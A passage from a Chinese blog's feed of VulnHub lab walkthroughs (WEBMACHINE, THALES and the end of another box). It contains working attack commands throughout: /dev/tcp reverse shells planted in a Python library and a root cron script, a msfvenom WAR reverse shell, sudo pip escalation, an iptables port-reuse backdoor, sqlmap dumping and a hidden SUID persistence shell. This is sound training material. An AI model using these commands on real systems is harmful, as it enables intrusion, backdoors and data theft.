id=\"py-依赖库修改\"><a class=\"markdownIt-Anchor\" href=\"#py-依赖库修改\">#</a> py 依赖库修改</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接将反弹shell的代码打印到此文件中</span></span><br><span class=\"line\">echo “bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1” &gt;&gt; /home/arsene/heist.py</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-351.png\" width=\"600\" alt=\"Image\">\n<p>没有权限去加载此 payload，翻阅目录，查找更多的敏感信息，发现这个文件里边有引入包 webbrower 这个操作，还有一份提示文件，这个提示文件就是说要运行此 python 文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">locate webbrowser寻找此文件 没有找到</span><br><span class=\"line\">find / -name “webbrowser”</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-352.png\" width=\"480\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将反弹shell的代码加载到此文件中</span></span><br><span class=\"line\">vim /usr/lib/python3.9/webbrowser.py</span><br><span class=\"line\">os.system(&#x27;/usr/bin/bash /tmp/shell.sh&#x27;)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell.sh内容如下</span></span><br><span class=\"line\">cat &gt; /tmp/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1</span><br><span class=\"line\">EOF</span><br><span class=\"line\">chmod +x /tmp/shell.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调用 arsene 去执行该文件</span></span><br><span class=\"line\">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-353.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 监听 4444 ，并且拿到了 arsene 用户的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-354.png\" width=\"490\" alt=\"Image\">\n<h3 id=\"sudopip提权\"><a class=\"markdownIt-Anchor\" href=\"#sudopip提权\">#</a> sudo (pip) 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看权限设置问题</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pip提权</span></span><br><span class=\"line\">TF=$(mktemp -d)</span><br><span class=\"line\">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">TF/setup.py</span></span><br><span class=\"line\">sudo pip install $TF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-355.png\" width=\"530\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n<h3 id=\"iptables-端口复用\"><a class=\"markdownIt-Anchor\" href=\"#iptables-端口复用\">#</a> iptables 端口复用</h3>\n<p>这里不做权限维持，直接上的权限隐藏，注意攻击机是 192.168.31.237 靶机是 192.168.31.236</p>\n<p>在目标服务器上依次执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建端口复用链子：</span></span><br><span class=\"line\">iptables -t nat -N MyChains</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">创建端口复用规则，访问192.168.3.6:80的流量转发至 22 端口：(如果要转发到其他ip机器，注意需要开启转发功能)</span></span><br><span class=\"line\">iptables -t nat -A MyChains -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置开启开关，当接收到一个含有<span class=\"string\">&quot;nihao123coming&quot;</span>的TCP包，则将来源IP添加到MyChains的列表中</span></span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &quot;nihao123coming&quot; --algo bm -m recent --</span><br><span class=\"line\">set --name MyChains --rsource -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置关闭开关，如果接收到含有<span class=\"string\">&quot;nihao123leaving&quot;</span>的TCP包，则将来源IP从MyChains的列表中删除</span></span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &quot;nihao123leaving&quot; --algo bm -m recent --</span><br><span class=\"line\">name MyChains --remove -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当发现SYN包的来源IP处于MyChains的列表中，将跳转到MyChains链进行处理，有效时间为 3600 秒</span></span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds</span><br><span class=\"line\">3600 --name MyChains --rsource -j MyChains</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-356.png\" alt></p>\n<p>攻击机上执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启复用，开启后发送开启命令的机器到目标 80 端口的流量将被转发到目标 20 端口</span></span><br><span class=\"line\">nc 192.168.3.6 80</span><br><span class=\"line\">nihao123coming</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-357.png\" width=\"490\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -p 80 icex64@192.168.31.236</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-358.png\" width=\"490\" alt=\"Image\">\n<p>从攻击机连接目标机器的 80 端口成功，此时 80 的网站我们将无法访问</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-359.png\" width=\"520\" alt=\"Image\">\n<p>用其他 ip 访问此网站也是打不开的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-360.png\" width=\"550\" alt=\"Image\">\n<p>关闭复用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 192.168.3.236 80</span><br><span class=\"line\">nihao123leaving</span><br><span class=\"line\">ssh -p 80 icex64@192.168.31.236</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将不能通过 80 连接，并且网站恢复正常</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-361.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; iptables 端口复用成功，可在攻击机上执行 nc 192.168.3.236 80 即可来开启或者关闭对方的 80 网站，从而进入到目标主机</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/117%20WEBMACHINE/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/117%20WEBMACHINE/",
            "title": "VULNHUB 17 WEBMACHINE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2ViLW1hY2hpbmUtbjcsNzU2Lw==\">https://www.vulnhub.com/entry/web-machine-n7,756/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3RodXNreWJsb2cvcC8xNjAyNzk0Ni5odG1s\">https://www.cnblogs.com/wthuskyblog/p/16027946.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 WEBMACHINE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-362.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.98</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.98</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-363.png\" width=\"350\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5Lw==\">http://192.168.31.109/</span> 进行信息收集，一个欢迎界面，审查源代码没有什么新发现，先对目标网站进行目录扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-364.png\" width=\"520\" alt=\"Image\">\n<p>扫描目录  <code>dirserch -u http://192.168.31.98/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-365.png\" width=\"520\" alt=\"Image\">\n<p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.98/enter_network -x php,txt,html,zip,rar</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-366.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 识别到了一个敏感目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZXhwbG9pdC5odG1s\">http://192.168.31.98/exploit.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-367.png\" width=\"450\" alt=\"Image\">\n<p>发现一个文件上传漏洞的页面，审查源代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-368.png\" width=\"580\" alt=\"Image\">\n<p>文件上传后，页面会跳转到 <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9wcm9maWxlLnBocA==\">http://127.0.0.1/profile.php</span></p>\n<h3 id=\"伪造html界面\"><a class=\"markdownIt-Anchor\" href=\"#伪造html界面\">#</a> 伪造 html 界面</h3>\n<p>伪造一个 html 界面，改变跳转的链接如下，使上传文件的地址到:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=\">http://192.168.31.98/profile.php</span></p>\n<p>开启本地的 python 简易服务器</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-369.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"文件上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h3>\n<p>登陆伪造的 html 界面，点击上传文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-370.png\" width=\"420\" alt=\"Image\">\n<p>将 kali 自带的 php 反弹 shell 代码修改 ip 和端口号</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-371.png\" width=\"390\" alt=\"Image\">\n<p>点击选择文件，讲 shell.php 文件上传到目标网站</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-372.png\" alt></p>\n<p>上传完成之后，页面重定向到了 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=\">http://192.168.31.98/profile.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-373.png\" width=\"380\" alt=\"Image\">\n<p>-&gt; 得到了一半的 flag</p>\n<p>目前得到的信息再无可利用的可能，需要更多的信息，但是不管加载多大的字典，都没有扫出来新的目录，通过查相关教程，发现这里隐藏了一个 enter_network 的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-374.png\" width=\"580\" alt=\"Image\">\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==\">http://192.168.31.98/enter_network</span></p>\n<h3 id=\"单点登录测试\"><a class=\"markdownIt-Anchor\" href=\"#单点登录测试\">#</a> 单点登录测试</h3>\n<img data-src=\"/N1h1l157/VULNHUB/image-375.png\" width=\"520\" alt=\"Image\">\n<p>注意到这是一个单点登录的地方，可能存在 sql 注入，也有可能会有 xss 漏洞，弱口令登陆等漏洞，这里简单尝试了一下没有发现有弱口令，尝试对这个目录再次进行目录扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-376.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 扫描一个重要的目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=\">http://192.168.31.98/enter_network/admin.php</span></p>\n<h3 id=\"修改cookie登陆后台\"><a class=\"markdownIt-Anchor\" href=\"#修改cookie登陆后台\">#</a> 修改 cookie 登陆后台</h3>\n<p>但是此页面只是 admin 的入口，查看网页是否存储了 cookie 的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-377.png\" width=\"520\" alt=\"Image\">\n<p>看到这里的角色是一串加密数据，是 base64 加密，其中 %253D 相当于 =</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-378.png\" width=\"580\" alt=\"Image\">\n<p>role 解密后的数据是采用的 md5 加密，继续用 <span class=\"exturl\" data-url=\"aHR0cDovL2NtZDUuY29t\">cmd5.com</span> 解密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-379.png\" width=\"520\" alt=\"Image\">\n<p>user 解密后的数据仍然是一个更加复杂的加密方式，这个加密暂时无法破解</p>\n<p>-&gt; role 解密后的数据最终显示为 admin, 修改存储在 cookie 中的值为 admin</p>\n<p>再次访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=\">http://192.168.31.98/enter_network/admin.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-380.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 于此，便得到了另外一半的 flag 的值</p>\n<h3 id=\"sqlmap-指定数据包\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-指定数据包\">#</a> sqlmap 指定数据包</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==\">http://192.168.31.98/enter_network</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-381.png\" width=\"580\" alt=\"Image\"></p>\n<p>这个页面是可能产生 sql 注入的，通过 burp 抓取数据包，讲数据包保存到本地文件 sqlmap.txt 如下</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-382.png\" alt></p>\n<p><code>sqlmap -r sqlmap.txt --batch --dbs</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-383.png\" width=\"280\" alt=\"Image\">\n<p>找到有四个数据库名</p>\n<h3 id=\"sqlmap-测试数据库\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-测试数据库\">#</a> sqlmap 测试数据库</h3>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine --tables</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-384.png\" width=\"310\" alt=\"Image\">\n<p>Machine 数据库中有 login 的表</p>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine -T login --columns</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-385.png\" width=\"190\" alt=\"Image\">\n<p>login 表下有 username,password,role 三个列</p>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-386.png\" width=\"330\" alt=\"Image\">\n<p>三个列里边分别有下面三个字段，同时也拿到了 flag</p>\n<p>尝试反弹 shell，通过 os-shell 失败，没有可写入的文件，但是可以通过下面的命令直接调用出 sql 语句，进行查表<br>\n <code>sqlmap -r sqlmap.txt --sql-shell</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-386.png\" width=\"350\" alt=\"Image\">\n<p>-&gt; 靶机结束</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/115%20THALES/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/115%20THALES/",
            "title": "VULNHUB 15 THALES",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhhbGVzLTEsNzQ5Lw==\">https://www.vulnhub.com/entry/thales-1,749/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTIzNTc3ODYy\">https://blog.csdn.net/weixin_43784056/article/details/123577862</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THALES：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-307.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.109</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.109</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-308.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 8080</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 [<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5\">http://192.168.31.109</span>](<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5\">http://192.168.31.109</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-309.png\" alt></p>\n<p>页面是一个普通的 tomcat 首页，没有直接可以点击的接口</p>\n<p>扫描目录  <code>dirsearch -u http://192.168.31.109:8080/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-310.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 对识别到的目录依次进行访问，找到了两个敏感目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==\">http://192.168.31.109/manager/html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==\">http://192.168.31.109/shell/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">换一个字典，重新扫描看是否有没有被找到的目录</span></span><br><span class=\"line\">gobuster dir -u http://192.168.31.109:8080 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-311.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==\">http://192.168.31.109/shell/</span><br>\n 是一个不停转圈的网站，猜测是作者遗留在此的一个后门文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-312.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==\">http://192.168.31.109/manager/html</span> 登陆界面，可进行爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-313.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"tomcat-弱口令爆破\"><a class=\"markdownIt-Anchor\" href=\"#tomcat-弱口令爆破\">#</a> tomcat 弱口令爆破</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf对此登陆框进行弱口令尝试</span></span><br><span class=\"line\">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class=\"line\">set RHOSTS 192.168.31.109</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-314.png\" width=\"520\" alt=\"Image\">\n<p>较长时间后，获取到了正确的 tomcat 密码<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-315.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 用户名：tomcat 密码：role1</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5OjgwODAvbWFuYWdlci9odG1s\">http://192.168.31.109:8080/manager/html</span> 存在一个文件上传的漏洞，可用来上传 war 后门文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-316.png\" alt></p>\n<h3 id=\"war-后门文件上传\"><a class=\"markdownIt-Anchor\" href=\"#war-后门文件上传\">#</a> War 后门文件上传</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf生成一个反弹shell的war文件木马</span></span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.135 LPORT=4444 -f</span><br><span class=\"line\">war -o revshell.war</span><br></pre></td></tr></table></figure>\n<p>同时监听 4444 端口，等待 shell 的反弹</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-317.png\" alt></p>\n<p>将 war 文件上传到 tomcat 上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-318.png\" alt></p>\n<p>在网站上已经显示出了具体的 url 地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-319.png\" alt></p>\n<p>点击此文件执行此反弹 shell 的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-320.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 拿到了服务器上的网站的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-321.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<p>查看 sudo -l 相关权限设置，查看是否有 s 权限设置错误<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-322.png\" width=\"400\" alt=\"Image\"></p>\n<p>查看是否可以通过 pkexec 提权<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-323.png\" width=\"435\" alt=\"Image\"></p>\n<p>翻阅目录，查找敏感文件<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-324.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1ub3Rlcy12YjhqNjB6LnhuLS10eHRiYWNrdXAteDc1bm9vMjJmY2ExaDMwNHFkYzBiZ2RnZ2EzNDRlZTk1aC5zaA==\">根据 notes.txt 文件提示有一个备份文件 backup.sh</span>，查看文件权限，发现所有者和组都是 root，所以应该是以 root 的身份在后台运行</p>\n<p>-&gt; 可以使用 pspy64 脚本查看一下</p>\n<h3 id=\"pspy64-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64-监控\">#</a> pspy64 监控</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip</span><br><span class=\"line\">python -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-325.png\" width=\"520\" alt=\"Image\">\n<p>通过 pspy 监视正在运行的进程，发现有 UID=0 执行的程序，<span class=\"exturl\" data-url=\"aHR0cDovL2JhY2t1cC5zaA==\">backup.sh</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-326.png\" width=\"470\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">可以将反弹root终端的代码插入到backup.sh中，监听相应端口</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件的最后两行</span></span><br><span class=\"line\">tail -n 2 /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-327.png\" width=\"400\" alt=\"Image\">\n<p>等待 shell 被反弹<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-328.png\" width=\"450\" alt=\"Image\"></p>\n<p>-&gt; 成功拿到 root 权限</p>\n<p>查看一下计划任务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看定时任务</span></span><br><span class=\"line\">crontab -l </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现是 5 分钟备份一次</span></span><br><span class=\"line\">*/5 * * * * bash /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> SUID 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新增用户</span></span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新增SUID文件</span></span><br><span class=\"line\">cp /bin/bash /var/.hack &amp;&amp; chmod 4755 /var/.hack</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">chattr锁定文件</span></span><br><span class=\"line\">ls -Alh /var/.hack &amp;&amp; chattr +i /var/.hack &amp;&amp; rm -f 